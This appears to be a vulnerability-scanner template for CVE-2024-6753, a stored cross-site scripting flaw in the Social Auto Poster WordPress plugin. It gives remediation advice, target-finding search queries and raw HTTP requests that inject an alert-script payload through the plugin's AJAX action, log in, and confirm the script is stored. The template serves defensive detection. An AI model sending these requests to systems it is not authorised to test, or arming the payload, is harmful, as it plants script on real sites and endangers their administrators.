id: CVE-2024-6753

info:
  name: Social Auto Poster <= 5.3.14 - Cross-Site Scripting
  author: Shivam Kamboj
  severity: high
  description: |
    The Social Auto Poster plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'mapTypes' parameter in the 'wpw_auto_poster_map_wordpress_post_type' AJAX function in all versions up to, and including, 5.3.14 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page (typically admin dashboard).
  remediation: |
    Update the Social Auto Poster plugin to version 5.3.15 or later. As a temporary workaround, restrict access to the 'wpw_auto_poster_map_wordpress_post_type' AJAX action.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-6753
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/3c268a6d-dfb4-4a9d-802e-80e5c1c53ca2
    - https://patchstack.com/database/vulnerability/social-auto-poster/wordpress-social-auto-poster-plugin-5-3-14-unauthenticated-stored-cross-site-scripting-vulnerability
    - https://codecanyon.net/item/social-auto-poster-wordpress-scheduler-marketing-plugin/5754169
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cve-id: CVE-2024-6753
    cwe-id: CWE-79
    epss-score: 0.03547
    epss-percentile: 0.87315
  metadata:
    verified: true
    max-request: 4
    vendor: wpwebinfotech
    product: social_auto_poster
    shodan-query: http.component:"WordPress"
    fofa-query: body="social-auto-poster"
  tags: cve,cve2024,wordpress,wp,wp-plugin,social-auto-poster,xss,kev

flow: http(1) || (http(2) && http(3))

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        action=wpw_auto_poster_map_wordpress_post_type&mapTypes=xss_test:<script>alert(document.domain)</script>&postType=post

    matchers:
      - type: word
        part: body
        words:
          - '"status":"success"'

  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

  - raw:
      - |
        GET /wp-admin/admin.php?page=wpw-auto-poster-settings HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<script>alert(document.domain)</script>")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
